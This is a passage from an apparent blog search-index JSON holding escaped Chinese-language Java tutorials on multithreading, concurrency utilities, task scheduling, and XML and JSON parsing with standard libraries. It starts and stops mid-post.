if(httpResponse.getStatusLine().getStatusCode() == 200){\n        srtResult = EntityUtils.toString(httpResponse.getEntity(), \"UTF-8\");//获得返回的结果                \n        System.out.println(srtResult);\n    }else\n    {\n        //Exception TODO\n    }\n} catch (IOException e) {\n    e.printStackTrace();\n}finally {\n    try {\n        httpClient.close();\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n}\n```","tags":["Java"],"categories":["Java","Java进阶"]},{"title":"Java 多线程和并发编程（续）","url":"/reimu-lighthouse/20210922/java-multithread2/","content":"## **1.并发框架Executor**\n- JDK 5开始提供Executor FrameWork (java.util.concurrent.*)\n    - 分离任务的创建和执行者的创建\n    - **线程重复利用(new线程代价很大)** \n\n### **共享线程池**\n- 预设好的多个Thread，可弹性增加\n- 多次执行很多很小的任务\n- 任务创建和执行过程解耦\n- **程序员无需关心线程池执行任务过程**\n\n### **主要类**\n- Executors.newCachedThreadPool/newFixedThreadPool 创建线程池\n- ExecutorService 线程池服务\n- Callable 具体的逻辑对象(线程类)\n    - **（Runnable的run方法没有返回值，而Callable的call方法可以有返回值）**\n- Future 返回结果\n```java\n//创建可变线程池\nprivate ThreadPoolExecutor executor = (ThreadPoolExecutor)Executors.newCachedThreadPool();\n//创建固定线程池\nprivate ThreadPoolExecutor executor = (ThreadPoolExecutor)Executors.newFixedThreadPool(5);\n\n//关闭线程池\nexecutor.shutdown();\n\n//执行任务，无返回值\nexecutor.execute(task);\n//执行任务，有返回值\nFuture<Integer> result=executor.submit(task);\n/*\npublic class Task implements Callable<Integer> {\n    @Override\n    public Integer call() throws Exception {\n        return null;\n    }\n}\n*/\n\n//线程池基础信息\nSystem.out.println(executor.getPoolSize());\nSystem.out.println(executor.getActiveCount());\nSystem.out.println(executor.getCompletedTaskCount());\n\n//Future返回类基本操作\nresult.isDone() //判断任务是否完成\nint sum=result.get(); //获得结果\n```\n\n## **2.并发框架Fork-join**\n- Java 7 提供另一种并行框架：分解、治理、合并(**分治编程**) \n- 适合用于整体任务量不好确定的场合(**最小任务可确定**)\n### **主要类**\n- ForkJoinPool 任务池\n- RecursiveAction\n- RecursiveTask\n```java\n//创建执行线程池\nForkJoinPool pool = new ForkJoinPool();\nForkJoinPool pool = new ForkJoinPool(4); //固定线程池\n\n//创建任务\nTask task = new Task(1, 10000000);\n/*\npublic class Task extends RecursiveTask<Integer> {\n    @Override\n    protected Integer compute() {\n        //任务足够小，则直接执行\n        //TODO\n        //任务大于阈值，分裂为2个任务\n        invokeAll(subTask1,subTask2);\n        Integer sum1 = subTask1.join();\n        Integer sum2 = subTask2.join();\n        // 结果合并\n        sum = sum1 + sum2;\n        return sum;\n    }\n}\n*/\n\n//提交任务\nForkJoinTask<Integer> result = pool.submit(task);\n\n//输出结果\nSystem.out.println(result.get().toString());\n```\n\n## **3.并发数据结构**\n- 常用的数据结构是线程不安全的\n    - ArrayList, HashMap, HashSet 非同步的\n    - 多个线程同时读写，可能会抛出异常或数据错误\n- 传统Vector，Hashtable等同步集合性能过差\n- 并发数据结构：数据添加和删除\n    - 阻塞式集合：当集合为空或者满时，等待\n    - 非阻塞式集合：当集合为空或者满时，不等待，返回null或异常\n\n- List\n    - Vector 同步安全，写多读少\n    - ArrayList 不安全\n    - Collections.synchronizedList(List list) 基于synchronized，效率差\n    - CopyOnWriteArrayList **读多写少**，基于复制机制，非阻塞\n- Set \n    - HashSet 不安全\n    - Collections.synchronizedSet(Set set) 基于synchronized，效率差\n    - CopyOnWriteArraySet (基于CopyOnWriteArrayList实现) **读多写少**，非阻塞\n- Map \n    - Hashtable 同步安全，写多读少\n    - HashMap 不安全\n    - Collections.synchronizedMap(Map map) 基于synchronized，效率差\n    - ConcurrentHashMap **读多写少**，非阻塞\n- Queue & Deque **(队列，JDK 1.5 提出)** \n    - ConcurrentLinkedQueue 非阻塞\n    - ArrayBlockingQueue/LinkedBlockingQueue 阻塞\n\n## **4.并发协作控制**\n### **Lock**\n- Lock也可以实现同步的效果\n    - 实现更复杂的临界区结构\n    - tryLock方法可以预判锁是否空闲\n    - 允许分离读写的操作，多个读，一个写\n    - 性能更好\n- ReentrantLock类，可重入的互斥锁\n- ReentrantReadWriteLock类，可重入的读写锁\n- lock和unlock函数\n```java\n//构造锁\nprivate static final ReentrantLock queueLock = new ReentrantLock(); //可重入锁\nprivate static final ReentrantReadWriteLock orderLock = new ReentrantReadWriteLock(); //可重入读写锁\n\n//基本函数\nqueueLock.tryLock()//尝试加锁(包含lock)，返回boolean\nqueueLock.lock() //加锁\nqueueLock.unlock()//解锁\norderLock.writeLock().lock()/unlock() //写加锁/解锁(写锁只能一个线程拥有)\norderLock.readLock().lock()/unlock() //读加锁/解锁(读锁多个线程共享)\n```\n\n### **Semaphore**\n- 信号量：本质上是一个计数器\n- 计数器大于0，可以使用，等于0不能使用\n- 可以设置多个并发量，例如限制10个访问\n- Semaphore\n    - acquire获取\n    - release释放\n- 比Lock更进一步，可以控制多个同时访问关键区\n```java\n//构造信号量\nprivate final Semaphore placeSemaphore = new Semaphore(5);\n\n//获取（信号量-1）\nplaceSemaphore.acquire();\n//尝试获取（包含acquire）\nplaceSemaphore.tryAcquire()\n\n//释放（信号量+1）\nplaceSemaphore.release();\n```\n\n### **Latch**\n- 等待锁，是一个同步辅助类\n- 用来同步执行任务的一个或者多个线程\n- 不是用来保护临界区或者共享资源\n- CountDownLatch\n    -  countDown() 计数减1\n    -  await() 等待latch变成0\n```java\n//构造等待锁\nCountDownLatch startSignal = new CountDownLatch(1);\n\n//计数减1\nstartSignal.countDown();\n\n//等待latch变成0\nstartSignal.await();\n```\n\n### **Barrier**\n- 集合点，也是一个同步辅助类\n- 允许多个线程在某一个点上进行同步\n- CyclicBarrier\n    - 构造函数是需要同步的线程数量\n    - await等待其他线程，到达数量后，就放行\n```java\n//当有3个线程在barrier上await，就执行finalResultCalculator中的run方法\nCalculateFinalResult finalResultCalculator = new CalculateFinalResult(results);\nCyclicBarrier barrier = new CyclicBarrier(3, finalResultCalculator);\n//class CalculateFinalResult implements Runnable {}\n\n//等待\nbarrier.await();\n```\n\n### **Phaser**\n- 允许执行并发多阶段任务，同步辅助类\n- 在每一个阶段结束的位置对线程进行同步，当所有的线程都到达这步，再进行下一步\n- Phaser\n    - arrive()    \n    - arriveAndAwaitAdvance()\n```java\n//构造\nPhaser phaser = new Phaser(5);\n\n//等到5个线程都到了，才放行\nphaser.arriveAndAwaitAdvance(); \n```\n\n### **Exchanger**\n- 允许在并发线程中互相交换消息\n- 允许在2个线程中定义同步点，当两个线程都到达同步点，它们交换数据结构\n- Exchanger\n    - exchange(), 线程双方互相交互数据\n    - 交换数据是双向的\n```java\n//构造，交换类型为String\nExchanger<String> exchanger = new Exchanger<String>();\n\n//对外交换null,获得内容放入item中\nString item = exchanger.exchange(null);\n```\n\n## **5.定时任务执行**\n### **简单定时器机制**\n- 设置计划任务，也就是在指定的时间开始执行某一个任务。 \n- TimerTask 封装任务\n- Timer类 定时器\n```java\n/*\nclass Task extends TimerTask {\n    public void run() {\n        //TODO\n    }\n}\n*/\n//当前时间1秒后，每2秒执行一次\ntimer.schedule(task, 1000, 2000);\n\n//取消当前的任务\ntask.cancel();\n//取消定时器\ntimer.cancel(); \n```\n\n### **Executor +定时器机制**\n- ScheduledExecutorService\n    - 定时任务\n    - 周期任务\n```java\n//固定时间（1s后）启动\nScheduledExecutorService executor = Executors.newScheduledThreadPool(1);\nexecutor.schedule(new MyTask(),1,TimeUnit.SECONDS);\n\n//周期任务 固定速率 是以上一个任务开始的时间计时，period时间过去后，检测上一个任务是否执行完毕\n//如果上一个任务执行完毕，则当前任务立即执行，如果上一个任务没有执行完毕，则需要等上一个任务执行完毕后立即执行\nScheduledExecutorService executor = Executors.newScheduledThreadPool(1);\nexecutor.scheduleAtFixedRate(new MyTask(),1,3000,TimeUnit.MILLISECONDS);\n\n//周期任务 固定延时 是以上一个任务结束时开始计时，period时间过去后，立即执行\nScheduledExecutorService executor = Executors.newScheduledThreadPool(1);\nexecutor.scheduleWithFixedDelay(new MyTask(),1,3000,TimeUnit.MILLISECONDS);\n```\n\n### **Quartz**\n- Quartz是一个较为完善的任务调度框架\n- 解决程序中Timer零散管理的问题\n- 功能更加强大\n    - Timer执行周期任务，如果中间某一次有异常，整个任务终止执行\n    - Quartz执行周期任务，如果中间某一次有异常，不影响下次任务执行\n    - ……\n```java\nimport org.quartz.JobDetail;\nimport org.quartz.Scheduler;\nimport org.quartz.Trigger;\nimport org.quartz.impl.StdSchedulerFactory;\n\nimport static org.quartz.JobBuilder.newJob;\nimport static org.quartz.SimpleScheduleBuilder.simpleSchedule;\nimport static org.quartz.TriggerBuilder.newTrigger;\n\n//创建scheduler\nScheduler scheduler = StdSchedulerFactory.getDefaultScheduler();\n\n//定义一个Trigger\nTrigger trigger = newTrigger().withIdentity(\"trigger1\", \"group1\") //定义name/group\n        .startNow()//一旦加入scheduler，立即生效\n        .withSchedule(simpleSchedule() //使用SimpleTrigger\n                .withIntervalInSeconds(2) //每隔2秒执行一次\n                .repeatForever()) //一直执行\n        .build();\n\n//定义一个JobDetail\nJobDetail job = newJob(HelloJob.class) //定义Job类为HelloQuartz类\n        .withIdentity(\"job1\", \"group1\") //定义name/group\n        .usingJobData(\"name\", \"quartz\") //定义属性\n        .build();\n\n/*\npublic class HelloJob implements Job {\n    @Override\n    public void execute(JobExecutionContext context) throws JobExecutionException {\n        //TODO\n    }\n}\n*/\n\n//加入这个调度\nscheduler.scheduleJob(job, trigger);\n\n//启动\nscheduler.start();\n\n//运行一段时间后关闭\nThread.sleep(10000);\nscheduler.shutdown(true);\n```","tags":["Java"],"categories":["Java","Java进阶"]},{"title":"Java 多线程和并发编程","url":"/reimu-lighthouse/20210922/java-multithread/","content":"## **1.概念**\n- 一个程序可以包括多个子任务，可串/并行\n- 每个子任务可以称为一个线程\n- 如果一个子任务阻塞，程序可以将CPU调度另外一个子任务进行工作。这样CPU还是保留在本程序中，而不是被调度到别的程序(进程)去。这样，提高本程序所获得CPU时间和利用率\n\n## **2.多线程实现**\n### **多线程创建**\n- java.lang.Thread\n    - 线程继承Thread类，实现run方法\n    ```java\n    public class Thread1 extends Thread {\n        public void run() {\n            System.out.println(\"run\");\n        }\n    }\n    ```\n- java.lang.Runnable接口\n    - 线程实现Runnable接口，实现run方法\n    ```java\n    public class Thread2 implements Runnable {\n        public void run() {\n            System.out.println(\"run\");\n        }\n    }\n    ```\n\n### **多线程启动**\n- **start方法，会自动以新进程调用run方法**\n```java\n//继承Thread类\nnew Thread1().start();\n\n//实现Runnable接口,必须包装在Thread类中才能启动\nnew Thread(new Thread2()).start();\n```\n- **直接调用run方法，将变成串行执行**\n- **同一个线程，多次start会报错，只执行第一次start方法**\n- 多个线程启动，其启动的先后顺序是随机的\n- 线程无需关闭，只要其run方法执行结束后，自动关闭\n- main函数(线程)可能早于新线程结束，整个程序并不终止\n- 整个程序终止是等所有的线程都终止(包括main函数线程)\n\n### **实现对比**\n- Thread vs Runnable\n    - **Thread占据了父类的名额，不如Runnable方便**\n    - Thread 类实现Runnable\n    - Runnable启动时需要Thread类的支持\n    - Runnable 更容易实现多线程中资源共享\n- 结论：建议实现Runnable接口来完成多线程\n\n## **3.多线程信息共享**\n- 通过共享变量在多个线程中共享消息\n    - 如果继承了Thread类，只能使用static变量\n    - 如果实现了Runnable接口，可以使用同一个成员变量\n\n### **信息共享问题**\n- 工作缓存副本\n    - 解决方法\n        - 采用**volatile**关键字修饰变量\n        ```java\n        private volatile boolean flag = false;\n        ```\n        - 保证不同线程对共享变量操作时的可见性\n- 关键步骤缺乏加锁限制\n    - 解决方法：关键步骤加锁限制\n        - 互斥：某一个线程运行一个代码段(关键区)，其他线程不能同时运行这个代码段\n        - 同步：多个线程的运行，必须按照某一种规定的先后顺序来运行\n        - 互斥是同步的一种特例\n    - 互斥的关键字是synchronized\n        - **synchronized代码块/函数，只能一个线程进入**\n        - synchronized加大性能负担，但是使用简便\n        ```java\n        public synchronized void sale() {\n            //TODO\n        }\n        //等同于\n        public void sale() {\n            synchronized(this) {\n                //TODO\n            }\n        }\n        ```\n\n## **4.多线程管理**\n### **线程状态**\n- NEW 刚创建(new)\n- RUNNABLE 就绪态(start)\n- RUNNING 运行中(run)\n- BLOCK 阻塞(sleep)\n- TERMINATED 结束\n\n- Thread的部分API已经废弃\n    - 暂停和恢复 suspend/resume\n    - 消亡 stop/destroy\n- 线程阻塞/和唤醒\n    - sleep，时间一到，自己会醒来\n    - wait/notify/notifyAll，等待，需要别人来唤醒\n    - join，等待另外一个线程结束\n    - interrupt，向另外一个线程发送中断信号，该线程收到信号，会触发InterruptedException(可解除阻塞)，并进行下一步处理\n\n- 线程被动地暂停和终止\n    - 依靠别的线程来拯救自己\n    - 没有及时释放资源\n- 线程主动暂停和终止\n    - 定期监测共享变量\n    - 如果需要暂停或者终止，先释放资源，再主动动作\n    - 暂停：Thread.sleep()，休眠\n    - 终止：run方法结束，线程终止\n\n- 多线程死锁\n    - 每个线程互相持有别人需要的锁\n    - **预防死锁，对资源进行等级排序**\n- 守护(后台)线程\n    - 普通线程的结束，是run方法运行结束\n    - 守护线程的结束，是run方法运行结束，或main函数结束\n    - **守护线程永远不要访问资源，如文件或数据库等**\n    ```java\n    Thread1 t = new Thread1();\n    t.setDaemon(true);\n    t.start();\n    ```\n- 线程查看工具 jvisualvm\n\n### **线程组管理**\n- 线程组ThreadGroup\n    - 线程的集合\n    - 树形结构，大线程组可以包括小线程组\n    - 可以通过enumerate方法遍历组内的线程，执行操作\n    - 能够有效管理多个线程，但是**管理效率低**\n    - 任务分配和执行过程**高度耦合**\n    - 重复创建线程、关闭线程操作，**无法重用线程**\n```java\n// 创建线程组\nThreadGroup threadGroup = new ThreadGroup(\"Searcher\");\n\n//创建线程\nSearcher searchTask=new Searcher();\nThread thread=new Thread(threadGroup, searchTask);\n//public class Searcher implements Runnable{}\n\n//返回线程组中还处于active的线程数（估计数）\nSystem.out.println(threadGroup.activeCount());\n\n//将线程组中active的线程拷贝到数组中\nThread[] threads=new Thread[threadGroup.activeCount()];\nthreadGroup.enumerate(threads);\nfor (int i=0; i<threadGroup.activeCount(); i++) {\n            System.out.printf(\"Thread %s: %s\\n\",threads[i].getName(),threads[i].getState());\n}\n\n//打印线程组中所有的线程信息\nthreadGroup.list();\n        \n//对线程组中的所有线程发出interrupt信号\nthreadGroup.interrupt();\n```","tags":["Java"],"categories":["Java","Java进阶"]},{"title":"Java 高级文件处理","url":"/reimu-lighthouse/20210922/java-advanced-file-processing/","content":"## **1.XML简介**\n- 可扩展标记语言：意义+数据\n-  标签可自行定义，具有自我描述性\n- 纯文本表示，跨系统/平台/语言\n- W3C标准(1998年，W3C发布了XML1.0，包括几乎所有的Unicode字符)\n```xml\n<Student>\n    <name>Tom</name>\n    <age>20</age>    \n</Student>\n\n```\n\n### **XML结构**\n- 常规语法\n    - 任何的起始标签都必须有一个结束标签\n    - 简化写法，例如，\\<name>\\</name>可以写为\\<name/>\n    - 大小写敏感，如\\<name>和\\<Name>不一样\n    - 每个文件都要有一个根元素\n    - 标签必须按合适的顺序进行嵌套，不可错位\n    - 所有的特性都必须有值，且在值的周围加上引号\n    - 需要转义字符，如“<”需要用&lt;代替 \n    - 注释：\\<!-- 注释内容 -->\n\n### **XML扩展**\n- DTD(Document Type Definition)\n    - 定义 XML 文档的结构\n    - 使用一系列合法的元素来定义文档结构\n    - 可嵌套在xml文档中，或者在xml中引用\n- XML Schema(XSD，XML Schema Definition)\n    - 定义 XML 文档的结构, DTD的继任者\n    - 支持数据类型，可扩展，功能更完善、强大\n    - 采用xml编写\n- XSL\n    - 扩展样式表语言(eXtensible Stylesheet Language)\n    - XSL作用于XML，等同于CSS作用于HTML\n    - 内容\n        - XSLT: 转换 XML 文档\n        - XPath: 在 XML 文档中导航\n        - XSL-FO: 格式化XML文档\n\n### **XML解析**\n- 树结构\n    - DOM: Document Object Model 文档对象模型，**擅长(小规模)读/写**\n- 流结构\n    - SAX: Simple API for XML 流机制解释器(推模式)，**擅长读**\n    - Stax: The Streaming API for XML 流机制解释器(拉模式)，**擅长读**，JDK 6 引入\n\n## **2.XML解析（基于DOM）**\n- DOM 是 W3C 处理 XML 的标准 API\n    - 直观易用\n    - 其处理方式是将 XML **整个**作为类似**树结构**的方式**读入内存**中以便操作及解析，方便修改\n    - 解析大数据量的 XML 文件，会遇到**内存泄露**及程序崩溃的风险\n```xml\n<font>\n    <name>Helvetica</name>\n    <size>36</size>\n</font>\n```\n```mermaid\ngraph TB\n    Document---ele[Element<font>]\n    ele---tex[Text:whitespace]\n    ele---name[Element<name>]\n    ele---tex2[Text:whitespace]\n    ele---size[Element<size>]\n    ele---tex3[Text:whitespace]\n    name---tex4[Text:Helvetica]\n    size---tex5[Text:36]\n```\n\n### **DOM类**\n- DocumentBuilder 解析类，parse方法\n- **Node 节点主接口，getChildNodes返回一个NodeList**\n- **NodeList 节点列表，每个元素是一个Node**\n- Document 文档根节点\n- Element 标签节点元素 (每一个标签都是标签节点)\n- Text节点 (包含在XML元素内的，都算Text节点) \n- Attr节点(每个属性节点) \n#### 读取：\n##### 1. 自上而下遍历（DFS）：\n```java\n//DOM解析xml文件\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\nDocumentBuilder db = dbf.newDocumentBuilder();\nDocument document = db.parse(\"pom.xml\");\n//获取所有一级子节点\nNodeList usersList = document.getChildNodes();\nSystem.out.println(usersList.getLength());\n\nfor (int i = 0; i < usersList.getLength(); i++) {\n    Node users = usersList.item(i);\n    //获取二级子节点列表\n    NodeList userList = users.getChildNodes();\n    System.out.println(\"==\" + userList.getLength());\n\n    for (int j = 0; j < userList.getLength(); j++) {\n        Node user = userList.item(j);\n        //排除whitespace\n        if (user.getNodeType() == Node.ELEMENT_NODE) {\n            //获取三级子节点列表\n            NodeList metaList = user.getChildNodes();\n            System.out.println(\"====\" + metaList.getLength());\n            //......\n        }\n    }\n}\n```\n##### 2. 根据名称进行搜索\n```java\n//DOM解析xml文件\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\nDocumentBuilder db = dbf.newDocumentBuilder();\nDocument document = db.parse(\"pom.xml\");\n\nElement rootElement =document.getDocumentElement();\n//获取所有标签名为name的节点\nNodeList nodeList=rootElement.getElementsByTagName(\"name\");\nif(nodeList!=null) {\n    for(int i=0;i<nodeList.getLength();i++) {\n        Element element = (Element)nodeList.item(i);\n        System.out.println(element.getNodeName()+\"=\"+element.getTextContent());\n    }\n}\n```\n#### 写入：\n```java\nDocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\nDocumentBuilder dbBuilder = dbFactory.newDocumentBuilder();\n//新建Documnet根节点\nDocument document = dbBuilder.newDocument();\nif (document != null) {\n    Element docx = document.createElement(\"document\");    //均采用Doucument创建元素\n    Element element = document.createElement(\"element\");\n    element.setAttribute(\"type\", \"paragraph\");    \n    element.setAttribute(\"alignment\", \"left\"); //element新增两个属性\n\n    Element object = document.createElement(\"object\");\n    object.setAttribute(\"type\", \"text\");\n\n    Element text = document.createElement(\"text\");\n    text.appendChild(document.createTextNode(\"abcdefg\")); //text节点赋值\n    Element bold = document.createElement(\"bold\");\n    bold.appendChild(document.createTextNode(\"true\")); //bold节点赋值\n\n    object.appendChild(text);\n    object.appendChild(bold);\n    element.appendChild(object);\n    docx.appendChild(element);\n    document.appendChild(docx);    //创建树状结构\n\n    TransformerFactory transformerFactory = TransformerFactory.newInstance();\n    Transformer transformer = transformerFactory.newTransformer();\n    DOMSource source = new DOMSource(document);\n    //定义目标文件\n    File file = new File(\"dom_result.xml\");\n    StreamResult result = new StreamResult(file);\n    //将xml内容写入到文件中\n    transformer.transform(source, result);\n}\n```\n\n## **3.XML解析（基于SAX）**\nSimple API for XML\n- 采用事件/流模型来解析 XML 文档，**更快速、更轻量**\n- 有选择的解析和访问，不像 DOM 加载整个文档，*内存要求较低*\n- SAX 对 XML 文档的解析为一次性读取，不创建/不存储文档对象，**很难同时访问文档中的多处数据**\n- 推模型。当它每发现一个节点就引发一个事件，而我们需要编写这些事件的处理程序\n- 关键类：DefaultHandler\n```java\npublic class SAXReader {\n    public static void main(String[] args) throws SAXException, IOException {\n        XMLReader parser = XMLReaderFactory.createXMLReader();\n        BookHandler bookHandler = new BookHandler();\n        parser.setContentHandler(bookHandler);\n        parser.parse(\"books.xml\");\n        System.out.println(bookHandler.getNameList());\n    }\n}\n\nclass BookHandler extends DefaultHandler {\n    private List<String> nameList;\n    private boolean title = false;\n\n    public List<String> getNameList() {\n        return nameList;\n    }\n\n    // xml文档加载时\n    public void startDocument() throws SAXException {\n        System.out.println(\"Start parsing document...\");\n        nameList = new ArrayList<String>();\n    }\n\n    // 文档解析结束\n    public void endDocument() throws SAXException {\n        System.out.println(\"End\");\n    }\n\n    // 访问某一个元素\n    public void startElement(String uri, String localName, String qName, Attributes atts) throws SAXException {\n        if (qName.equals(\"title\")) {\n            title = true;\n        }\n    }\n\n    // 结束访问元素\n    public void endElement(String namespaceURI, String localName, String qName) throws SAXException {\n        // End of processing current element\n        if (title) {\n            title = false;\n        }\n    }\n\n    // 访问元素正文\n    public void characters(char[] ch, int start, int length) {\n        if (title) {\n            String bookTitle = new String(ch, start, length);\n            System.out.println(\"Book title: \" + bookTitle);\n            nameList.add(bookTitle);\n        }\n    }\n}\n```\n\n## **4.XML解析（基于Stax）**\nStreaming API for XML\n- 流模型中的拉模型\n- 在遍历文档时，会把感兴趣的部分从读取器中拉出，不需要引发事件，允许我们**选择性地处理节点**。这大大提高了灵活性，以及整体效率\n- 两套处理API\n    - 基于指针的API， XMLStreamReader\n    - 基于迭代器的API，XMLEventReader\n\n```java\npublic class StaxReader {\n\n    public static void main(String[] args) {\n        StaxReader.readByStream();    //基于指针遍历\n        StaxReader.readByEvent();    //基于迭代器遍历\n    }\n\n    // 流模式\n    public static void readByStream() {\n        //固定写法\n        String xmlFile = \"books.xml\";\n        XMLInputFactory factory = XMLInputFactory.newFactory();\n        XMLStreamReader streamReader = null;\n        try {\n            streamReader = factory.createXMLStreamReader(new FileReader(xmlFile));\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        } catch (XMLStreamException e) {\n            e.printStackTrace();\n        }\n\n        //基于指针遍历\n        try {\n            while (streamReader.hasNext()) {\n                int event = streamReader.next();\n                // 如果是元素的开始\n                if (event == XMLStreamConstants.START_ELEMENT) {\n                    // 列出所有书籍名称\n                    if (\"title\".equalsIgnoreCase(streamReader.getLocalName())) {\n                        System.out.println(\"title:\" + streamReader.getElementText());\n                    }\n                }\n            }\n            streamReader.close();\n        } catch (XMLStreamException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // 事件模式\n    public static void readByEvent() {\n        String xmlFile = \"books.xml\";\n        XMLInputFactory factory = XMLInputFactory.newInstance();\n        boolean titleFlag = false;\n        try {\n            // 创建基于迭代器的事件读取器对象\n            XMLEventReader eventReader = factory.createXMLEventReader(new FileReader(xmlFile));\n            // 遍历Event迭代器\n            while (eventReader.hasNext()) {\n                XMLEvent event = eventReader.nextEvent();\n                // 如果事件对象是元素的开始\n                if (event.isStartElement()) {\n                    // 转换成开始元素事件对象\n                    StartElement start = event.asStartElement();\n                    // 打印元素标签的本地名称\n\n                    String name = start.getName().getLocalPart();\n                    // System.out.print(start.getName().getLocalPart());\n                    if (name.equals(\"title\")) {\n                        titleFlag = true;\n                        System.out.print(\"title:\");\n                    }\n\n                    // 取得所有属性\n                    Iterator attrs = start.getAttributes();\n                    while (attrs.hasNext()) {\n                        // 打印所有属性信息\n                        Attribute attr = (Attribute) attrs.next();\n                        // System.out.print(\":\" + attr.getName().getLocalPart() + \"=\" +\n                        // attr.getValue());\n                    }\n                    // System.out.println();\n                }\n                // 如果是正文\n                if (event.isCharacters()) {\n                    String s = event.asCharacters().getData();\n                    if (null != s && s.trim().length() > 0 && titleFlag) {\n                        System.out.println(s.trim());\n                    }\n                }\n                // 如果事件对象是元素的结束\n                if (event.isEndElement()) {\n                    EndElement end = event.asEndElement();\n                    String name = end.getName().getLocalPart();\n                    if (name.equals(\"title\")) {\n                        titleFlag = false;\n                    }\n                }\n            }\n            eventReader.close();\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        } catch (XMLStreamException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n## **5.JSON简介**\n- JavaScript Object Notation, JS 对象表示法\n- 是一种轻量级的数据交换格式\n- 类似XML，更小、更快、更易解析\n- 最早用于Javascript中，容易解析，最后推广到全语言\n- 尽管使用Javascript语法，但是**独立于编程语言**\n\n### **JSONObject和JSONArray**\n- 名称/值对。如\"firstName\":\"John\"\n    - JSON对象：{“name\":\"Jo\",\"email\":\"a@b.com\"}\n    - 数据在键值对中\n    - 数据由逗号分隔\n    - 花括号保存对象\n- JSON数组\n    - 方括号保存数组\n        [{“name\":\"Jo\",\"email\":\"a@b.com\"}, {“name\":\"Jo\",\"email\":\"a@b.com\"}]\n\n### **Java的JSON处理**\n- org.json：JSON官方推荐的解析类\n    - 简单易用，通用性强\n    -  复杂功能欠缺\n- GSON：Google出品\n    - 基于反射，可以实现JSON对象、JSON字符串和Java对象互转\n- Jackson：号称最快的JSON处理器\n    - 简单易用，社区更新和发布速度比较快\n\n### **Json主要用途**\n- JSON生成\n- JSON解析\n- JSON校验\n- 和**Java Bean**对象进行互解析\n    - 具有一个无参的构造函数\n    - 可以包括多个属性，所有属性都是private\n    - 每个属性都有相应的Getter/Setter方法\n    - Java Bean用于封装数据，又可称为POJO(Plain Old Java Object)\n\n### **org.json**\n```java\npublic static void main(String[] args) {\n        testJsonObject();\n        testJsonFile();\n    }\n\n    public static void testJsonObject() {\n        // 构造对象\n        Person p = new Person();\n        p.setName(\"Tom\");\n        p.setAge(20);\n\n        // 构造JSONObject对象\n        JSONObject obj = new JSONObject();\n        obj.put(\"name\", p.getName());\n        obj.put(\"age\", p.getAge());\n        System.out.println(\"name: \" + obj.getString(\"name\"));\n        System.out.println(\"age: \" + obj.getInt(\"age\"));\n    }\n\n    public static void testJsonFile() {\n        File file = new File(\"books.json\");\n        try (FileReader reader = new FileReader(file)) {\n            // 读取文件内容到JsonObject对象中\n            int fileLen = (int) file.length();\n            char[] chars = new char[fileLen];\n            reader.read(chars);\n            String s = String.valueOf(chars);\n            JSONObject jsonObject = new JSONObject(s);\n\n            // 开始解析JSONObject对象\n            JSONArray books = jsonObject.getJSONArray(\"books\");\n            List<Book> bookList = new ArrayList<>();\n            for (Object book : books) {\n                // 获取单个JSONObject对象\n                JSONObject bookObject = (JSONObject) book;\n                Book book1 = new Book();\n                book1.setAuthor(bookObject.getString(\"author\"));\n                book1.setYear(bookObject.getString(\"year\"));\n                book1.setTitle(bookObject.getString(\"title\"));\n                book1.setPrice(bookObject.getInt(\"price\"));\n                book1.setCategory(bookObject.getString(\"category\"));\n                bookList.add(book1);\n            }\n\n            for (Book book : bookList) {\n                System.out.println(book.getAuthor() + \",  \" + book.getTitle());\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n```\n### **GSON**\n```java\npublic static void main(String[] args) {\n        testJsonObject();\n        testJsonFile();\n    }\n\n    public static void testJsonObject() {\n        // 构造对象\n        Person p = new Person();\n        p.setName(\"Tom\");\n        p.setAge(20);\n\n        // 从Java对象到JSON字符串\n        Gson gson = new Gson();\n        String s = gson.toJson(p);\n        System.out.println(s); // {\"name\":\"Tom\",\"age\":20}\n\n        // 从JSON字符串到Java对象\n        Person p2 = gson.fromJson(s, Person.class);\n        System.out.println(p2.getName()); // Tom\n        System.out.println(p2.getAge()); // 20\n\n        // 调用GSON的JsonObject\n        JsonObject json = gson.toJsonTree(p).getAsJsonObject(); // 将整个json解析为一颗树\n        System.out.println(json.get(\"name\")); // \"Tom\"\n        System.out.println(json.get(\"age\")); // 20\n    }\n\n    public static void testJsonFile() {\n        Gson gson = new Gson();\n        File file = new File(\"books2.json\");\n\n        try (FileReader reader = new FileReader(file)) {\n            List<Book> books = gson.fromJson(reader, new TypeToken<List<Book>>() {\n            }.getType());\n\n            for (Book book : books) {\n                System.out.println(book.getAuthor() + \",  \" + book.getTitle());\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n```\n### **Jackson**\n```java\npublic static void main(String[] args) throws Exception {\n        testJsonObject();\n        testJsonFile();\n    }\n    \n    static void testJsonObject() throws IOException {\n        ObjectMapper om = new ObjectMapper();\n        \n        //构造对象\n        Person p = new Person();\n        p.setName(\"Tom\");\n        p.setAge(20);\n        \n        //将对象解析为json字符串\n        String jsonStr = om.writeValueAsString(p);\n        System.out.println(jsonStr);\n        \n        //从json字符串重构对象\n        Person p2 = om.readValue(jsonStr, Person.class);\n        System.out.println(p2.getName());\n        System.out.println(p2.getAge());\n        \n        //从json字符串重构为JsonNode对象\n        JsonNode node = om.readTree(jsonStr);\n        System.out.println(node.get(\"name\").asText());\n        System.out.println(node.get(\"age\").asText());\n    }\n    \n    static void testJsonFile() throws IOException {\n        ObjectMapper om = new ObjectMapper();\n        \n        //从json文件中加载，并重构为java对象\n        File json2 = new File(\"books2.json\");\n        List<Book> books = om.readValue(json2, new TypeReference<List<Book>>(){});\n        for (Book book : books) {\n            System.out.println(book.getAuthor());\n            System.out.println(book.getTitle());\n        }\n    }    \n```\n\n### **JSON vs XML**\n- 都是数据交换格式，可读性强，可扩展性高\n- 大部分的情况下，JSON更具优势（编码简单，转换方便）\n- JSON字符长度一般小于XML，传输效率更高\n- **XML更加注重标签和顺序**\n- **JSON会丢失信息**","tags":["Java"],"categories":["Java","Java进阶"]},{"title":"Java 高级文件处理（续）","url":"/reimu-lighthouse/20210921/java-advanced-file-processing2/","content":"## **1. 图像处理**\n### 